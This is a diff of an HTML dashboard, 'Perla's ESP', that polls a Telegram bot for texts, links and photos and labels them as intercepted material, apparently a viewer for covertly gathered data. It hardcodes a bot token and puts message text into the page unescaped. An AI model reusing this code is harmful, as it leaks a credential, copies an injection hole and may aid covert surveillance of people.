@@ -7,7 +7,7 @@
     <style>
         :root {
             --neon-blue: #00d2ff;
-            --dark-bg: #12141d; /* لون أسود داكن أقل حدة */
+            --dark-bg: #12141d; 
             --card-bg: rgba(255, 255, 255, 0.05);
             --border: rgba(0, 210, 255, 0.2);
             --time-color: #00d2ff;
@@ -78,14 +78,12 @@
             transition: 0.3s;
         }
 
-        .login-box button:hover { opacity: 0.8; transform: scale(1.05); }
-
         /* الواجهة الرئيسية */
         #main-content { display: none; }
 
         .header {
             text-align: center;
-            padding: 40px 20px;
+            padding: 30px 20px;
             animation: fadeInDown 0.8s ease-out;
         }
 
@@ -106,13 +104,34 @@
 
         .app-container { max-width: 700px; margin: auto; padding: 20px; }
 
+        /* شريط التحكم والمساحة */
+        .controls {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+
+        .clear-btn {
+            background: rgba(255, 50, 50, 0.2);
+            border: 1px solid #ff3232;
+            color: #ff3232;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .clear-btn:hover { background: #ff3232; color: white; }
+
         .status-bar {
-            text-align: center;
             font-size: 0.8rem;
             color: var(--neon-blue);
             text-transform: uppercase;
-            letter-spacing: 3px;
-            margin-top: 10px;
+            letter-spacing: 2px;
         }
 
         /* كرت الرسالة */
@@ -127,8 +146,6 @@
             animation: slideUp 0.5s ease-out;
         }
 
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
         .item-header {
             display: flex;
             justify-content: space-between;
@@ -138,9 +155,8 @@
             padding-bottom: 8px;
         }
 
-        .type-info { color: var(--neon-blue); font-weight: 800; font-size: 0.85rem; letter-spacing: 1px; }
+        .type-info { color: var(--neon-blue); font-weight: 800; font-size: 0.85rem; }
         
-        /* الساعة بشكل واضح */
         .time-label { 
             color: var(--time-color); 
             font-size: 0.95rem; 
@@ -148,67 +164,38 @@
             background: rgba(0, 210, 255, 0.1);
             padding: 4px 10px;
             border-radius: 5px;
-            border: 1px solid rgba(0, 210, 255, 0.3);
         }
 
-        .content-direct {
-            line-height: 1.6;
-            color: #e0e0e0;
-            font-size: 1.05rem;
-            word-wrap: break-word;
-        }
+        .content-direct { line-height: 1.6; color: #e0e0e0; font-size: 1.05rem; word-wrap: break-word; }
 
         .link-style {
-            color: #000;
-            background: var(--neon-blue);
-            text-decoration: none;
-            padding: 12px;
-            display: block;
-            margin-top: 12px;
-            text-align: center;
-            border-radius: 8px;
-            font-weight: bold;
-            transition: 0.3s;
+            color: #000; background: var(--neon-blue);
+            text-decoration: none; padding: 12px;
+            display: block; margin-top: 12px;
+            text-align: center; border-radius: 8px; font-weight: bold;
         }
-
-        .link-style:hover { background: #fff; }
 
         .photo-trigger {
             background: rgba(255, 255, 255, 0.05);
-            padding: 15px;
-            text-align: center;
-            cursor: pointer;
-            border-radius: 8px;
-            margin-top: 10px;
-            color: var(--neon-blue);
-            font-weight: bold;
-            border: 1px solid var(--border);
+            padding: 15px; text-align: center; cursor: pointer;
+            border-radius: 8px; margin-top: 10px;
+            color: var(--neon-blue); font-weight: bold; border: 1px solid var(--border);
         }
 
         #content-viewer {
-            display: none;
-            position: fixed;
+            display: none; position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--dark-bg);
-            z-index: 9999;
-            padding: 30px;
-            box-sizing: border-box;
+            background: var(--dark-bg); z-index: 9999;
+            padding: 30px; box-sizing: border-box;
         }
 
-        .back-btn {
-            background: var(--neon-blue);
-            border: none;
-            color: black;
-            padding: 10px 25px;
-            cursor: pointer;
-            font-weight: bold;
-            border-radius: 4px;
-        }
+        .back-btn { background: var(--neon-blue); border: none; color: black; padding: 10px 25px; cursor: pointer; font-weight: bold; border-radius: 4px; }
 
         .display-area { text-align: center; margin-top: 40px; }
         .display-area img { max-width: 100%; border-radius: 12px; box-shadow: 0 0 50px rgba(0, 210, 255, 0.3); }
 
         @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -225,10 +212,15 @@
 <div id="main-content">
     <div class="header">
         <h1 class="logo-text">Perla's ESP</h1>
-        <div class="status-bar" id="status-text">INITIALIZING...</div>
     </div>
 
-    <div class="app-container" id="notifications-list"></div>
+    <div class="app-container">
+        <div class="controls">
+            <div class="status-bar" id="status-text">SYSTEM READY</div>
+            <button class="clear-btn" onclick="clearLogs()">CLEAR ALL LOGS</button>
+        </div>
+        <div id="notifications-list"></div>
+    </div>
 </div>
 
 <div id="content-viewer">
@@ -241,22 +233,20 @@
     const TOKEN = "8560208461:AAEC-4k06FP__JYXiiXPv-kDdyWRGNXNQhI";
     let lastId = 0;
 
-    // فحص الرمز
     function checkAccess() {
-        const input = document.getElementById('pin-input').value;
-        if (input === CORRECT_PIN) {
+        if (document.getElementById('pin-input').value === CORRECT_PIN) {
             document.getElementById('login-screen').style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
             startSystem();
-        } else {
-            alert("WRONG PIN. ACCESS DENIED.");
-        }
+        } else { alert("WRONG PIN!"); }
     }
 
-    // السماح بضغط Enter للدخول
-    document.getElementById('pin-input').addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') checkAccess();
-    });
+    // وظيفة مسح الرسائل من الشاشة
+    function clearLogs() {
+        if(confirm("Are you sure you want to clear all logs?")) {
+            document.getElementById('notifications-list').innerHTML = "";
+        }
+    }
 
     function showPhoto(url) {
         document.getElementById('viewer-body').innerHTML = `<h3 style="color:var(--neon-blue)">INTERCEPTED IMAGE</h3><img src="${url}">`;
@@ -276,7 +266,7 @@
     }
 
     function startSystem() {
-        updateLoop(); // أول تشغيل
+        updateLoop();
         setInterval(updateLoop, 2000);
     }
 
@@ -292,46 +282,33 @@
                     const m = item.message;
                     if (!m) continue;
 
-                    // تنسيق الوقت بشكل واضح
-                    const dateObj = new Date(m.date * 1000);
-                    const timeStr = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-
+                    const timeStr = new Date(m.date * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                     const div = document.createElement('div');
                     div.className = 'notification-item';
 
                     let innerContent = "";
-                    
                     if (m.text) {
                         const isLink = m.text.includes("http") || m.text.includes("www");
                         if (isLink) {
-                            let finalUrl = m.text.trim();
-                            if (!finalUrl.startsWith('http')) finalUrl = 'https://' + finalUrl;
-                            innerContent = `
-                                <div class="item-header"><span class="type-info">🔗 LINK INTERCEPTED</span><span class="time-label">${timeStr}</span></div>
-                                <a href="${finalUrl}" target="_blank" class="link-style">OPEN SECURE LINK</a>
-                                <div style="font-size:0.8rem; margin-top:8px; color:#777;">URL: ${m.text}</div>`;
+                            let url = m.text.trim(); if (!url.startsWith('http')) url = 'https://' + url;
+                            innerContent = `<div class="item-header"><span class="type-info">🔗 LINK</span><span class="time-label">${timeStr}</span></div>
+                                            <a href="${url}" target="_blank" class="link-style">OPEN LINK</a>`;
                         } else {
-                            innerContent = `
-                                <div class="item-header"><span class="type-info">💬 TEXT DATA</span><span class="time-label">${timeStr}</span></div>
-                                <div class="content-direct">${m.text}</div>`;
+                            innerContent = `<div class="item-header"><span class="type-info">💬 TEXT</span><span class="time-label">${timeStr}</span></div>
+                                            <div class="content-direct">${m.text}</div>`;
                         }
                     } else if (m.photo) {
                         const url = await fetchFiles(m.photo[m.photo.length - 1].file_id);
-                        innerContent = `
-                            <div class="item-header"><span class="type-info">📸 VISUAL CAPTURE</span><span class="time-label">${timeStr}</span></div>
-                            <div class="photo-trigger" onclick="showPhoto('${url}')">DECRYPT & VIEW IMAGE</div>`;
+                        innerContent = `<div class="item-header"><span class="type-info">📸 IMAGE</span><span class="time-label">${timeStr}</span></div>
+                                        <div class="photo-trigger" onclick="showPhoto('${url}')">VIEW IMAGE</div>`;
                     }
-
                     div.innerHTML = innerContent;
                     list.prepend(div);
                 }
-                document.getElementById('status-text').innerText = "SYSTEM ONLINE - MONITORING";
+                document.getElementById('status-text').innerText = "SYSTEM ONLINE";
             }
-        } catch (e) { 
-            document.getElementById('status-text').innerText = "CONNECTION ERROR";
-        }
+        } catch (e) { }
     }
 </script>
-
 </body>
 </html>
